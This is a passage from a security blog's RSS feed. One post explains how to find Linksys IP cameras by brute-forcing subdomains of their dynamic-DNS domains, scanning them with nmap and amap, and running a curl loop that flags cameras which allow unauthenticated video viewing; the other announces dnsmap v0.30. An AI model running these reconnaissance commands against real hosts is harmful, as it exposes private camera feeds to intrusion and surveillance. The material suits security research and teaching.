-<li><code>linksys-cam.com</code></li>
-<li><code>mylinksyscamera.com</code></li>
-<li><code>mylinksyshome.com</code></li>
-<li><code>mylinksyscam.com</code></li>
-<li><code>mylinksysview.com</code></li>
-<li><code>linksysremotecam.com</code></li>
-<li><code>linksysremoteview.com</code></li>
-<li><code>linksyshomemonitor.com</code></li>
-</ul>
-<h3 id="camera-discovery-process-through-subdomain-bruteforcing">Camera discovery process through subdomain bruteforcing</h3>
-<p>We first save the aforementioned domains in a file, <code>doms</code> in this case. Then we use <a href="http://code.google.com/p/dnsmap/">dnsmap</a> to bruteforce subdomains for each of the domains included in <code>doms</code>.</p>
-<p>Using dnsmap&#39;s built-in wordlist:</p>
-<pre><code>$ for i in `cat doms`;do dnsmap $i -r ~/ -i 64.14.13.199,216.39.81.84&amp;done;</code></pre><p>Using a user-supplied wordlist, <code>wordlist_TLAs.txt</code> in this case, which is a three-letter acronym wordlist included with dnsmap v0.30:</p>
-<pre><code>$ for i in `cat doms`;do dnsmap $i -w wordlist_TLAs.txt -r ~/ -i 64.14.13.199,216.39.81.84&amp;done;</code></pre><p>NOTE: dnsmap&#39;s <code>-i</code> option allows ignoring user-supplied IP addresses from the results. In this case, 64.14.13.199 and 216.39.81.84 belong to the <a href="http://www.tzo.com/">DDNS service provider</a>, and would therefore be regarded as false positives in this case (we&#39;re only interested in IP cameras setup by their respective owners after all). For more info on how to use dnsmap, checkout the <a href="http://code.google.com/p/dnsmap/source/browse/trunk/README.txt">README</a> file.</p>
-<p>We then parse the IP addresses of the subdomains discovered by dnsmap:</p>
-<pre><code>$ grep \# dnsmap*.txt | awk &#39;{print $4}&#39; | sort | uniq &gt; ips.txt</code></pre><p>Next, we scan for ports that could potentially be used by a Linksys IP camera web server. In this case, we choose TCP ports 80, 1024 and 1025 as candidates:</p>
-<pre><code>$ sudo nmap -v -T4 -n -P0 -sS -p80,1024,1025 -iL ips.txt -oA nmap_http_ports.`date +%Y-%m-%d-%H%M%S`</code></pre><p>This leaves us with a lot of discovered services, but we don&#39;t quite yet know which of them correspond to actual Linksys IP cameras web interfaces. There are many ways to fingreprint the web server of a Linksys IP camera. In this case we chose to create our own <a href="http://freeworld.thc.org/thc-amap/">amap</a> response signature, and then scan the open ports with amap.</p>
-<p>Before amap is capable of identifying our target Linksys IP cams, the following response signature needs to be added to <code>appdefs.resp</code>, and amap then needs to be recompiled. Otherwise amap won&#39;t take the new signature into account:</p>
-<pre><code>http-linksys-cam::tcp::^HTTP/.*\nServer: thttpd/.*Accept-Ranges: bytes.*WVC</code></pre><p>Please note that the previous amap response signature was only tested against the WVC54GCA and WVC80N Linksys IP camera models. So I&#39;m not sure if it will work against other models. You&#39;ve been warned!</p>
-<p>Once recompiled, amap can be used to identify Linksys IP cameras from nmap&#39;s open ports results. </p>
-<pre><code>$ amap -i nmap_http_ports.2010-02-22-102001.gnmap -R -S -o amap_results.`date +%Y-%m-%d-%H%M%S`</code></pre><p>We finally parse the IP addresses and open ports for all discovered Linksys IP cameras:</p>
-<pre><code>$ grep http-linksys-cam amap_results.2010-02-22-102253 | awk &#39;{print $3}&#39; | cut -d \/ -f1
-x.x.167.245:1024
-x.x.228.231:1025
-x.x.228.231:80
-x.x.64.22:80
-x.x.206.70:1024
-x.x.31.4:1024
-x.x.164.28:1024
-_[snip]_</code></pre><p>At this point we have accomplished the task of creating a list of Linksys IP cameras without resorting to search engines or scanning random IP addresses. In order to discover more Linksys cameras, a more comprehensive wordlist would need to be used with dnsmap.</p>
-<p>Of course, even further automation would be possible. For instance, an attacker may wish to programmatically identify which Linksys cameras from the previous list allowing video viewing to unauthenticated users:</p>
-<pre><code class="language-bash">$ amapfile=amap_results.2010-02-22-102253; <span class="keyword">for</span> i <span class="keyword">in</span> `grep http-linksys-cam <span class="variable">$amapfile</span> | awk <span class="string">'{print $3}'</span> | cut -d \/ -f1`;<span class="keyword">do</span> url=<span class="string">"http://<span class="variable">$i</span>/img/main.cgi?next_file=main.htm"</span>; <span class="keyword">if</span> curl --connect-timeout 2 -s -I --url <span class="variable">$url</span> | grep ^<span class="string">"HTTP/1.1 501"</span>&gt;/dev/null;<span class="keyword">then</span> <span class="built_in">echo</span> <span class="variable">$url</span>;<span class="keyword">fi</span>;<span class="keyword">done</span>;
-x.x.206.70:1024/img/main.cgi?next_file=main.htm
-x.x.105.221:1024/img/main.cgi?next_file=main.htm
-x.x.105.221:80/img/main.cgi?next_file=main.htm
-x.x.181.195:1024/img/main.cgi?next_file=main.htm
-x.x.243.154:1024/img/main.cgi?next_file=main.htm
-x.x.243.154:1025/img/main.cgi?next_file=main.htm
-x.x.30.196:1025/img/main.cgi?next_file=main.htm
-_[snip]_</code></pre>
-<p><em>In addition to automatically checking for anonymous video viewing on all cameras found, other tasks such as checking for default credentials (<code>admin</code>/<code>admin</code>) could also be scripted, although this will NOT be included in this post (or any other at GNUCITIZEN).</em></p>
-
-]]></description></item><item><title>Dnsmap v0.30 is now out!</title><link>https://www.gnucitizen.org/blog/dnsmap-v030-is-now-out/</link><pubDate>Sat, 20 Feb 2010 21:08:48 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/dnsmap-v030-is-now-out/</guid><dc:creator>pagvac</dc:creator><description><![CDATA[
-<p>After working on <a href="http://dnsmap.googlecode.com/">dnsmap</a> for a few months whenever time allowed, I decided there were enough additional goodies to make version 0.30 a new public release. Let me just say that a lot of the bugs that have been fixed, and features that have been added to this version would not be possible without the feedback from great folks such as <a href="http://www.bothunters.pl">Borys Lacki</a>, <a href="http://7c0.org">Philipp Winter</a> and <a href="http://kinqpinz.info">meathive</a>. Thanks guys, your feedback was highly valuable to me.</p>
-<h2 id="new-features">New Features</h2>
-<p>Anyways, the following are some of the new features included:</p>
-<pre><code>* IPv6 support
-* Makefile included
-* Delay option (-d) added. This is useful in cases where dnsmap is killing your bandwidth
-* Ignore IPs option (-i) added. Useful for domains which cause dnsmap to produce false positives
-* Changes made to make dnsmap compatible with OpenDNS
-* Disclosure of internal IP addresses (RFC 1918) are reported
-* Updated built-in wordlist
-* Included a standalone three-letter acronym (TLA) subdomains wordlist
-* Domains susceptible to [same site scripting](http://snipurl.com/etbcv) are reported
-* Completion time is now displayed to the user
-* Mechanism to attempt to bruteforce wildcard-enabled domains
-* Unique filename containing timestamp is now created when no specific output filename is supplied by user
-* Various minor bugs fixed</code></pre><p>For those who have never used dnsmap, dnsmap is a command line tool originally released in 2006 which helps discover target subdomains and IP ranges during the initial stages of an infrastructure pentest. dnsmap is a passive(ish) discovery tool meant to be used before an actual active attack. It&#39;s an alternative to other discovery techniques such as whois lookups, scanning large IP ranges, etc. Run dnsmap and you should be able spot netblocks of a target organization in a relatively short period of time.</p>
-<p>Dnsmap is open source and is known to work on Linux, FreeBSD and Windows using Cygwin, although it has mostly been tested on Linux. The major drawback is lack of multi-threading support, which I&#39;m hoping will be included in the next public release. Life is busy these days, but I&#39;ll try to spend some time on this project when time allows and inspiration is available!</p>
 
 ]]></description></item></channel></rss>
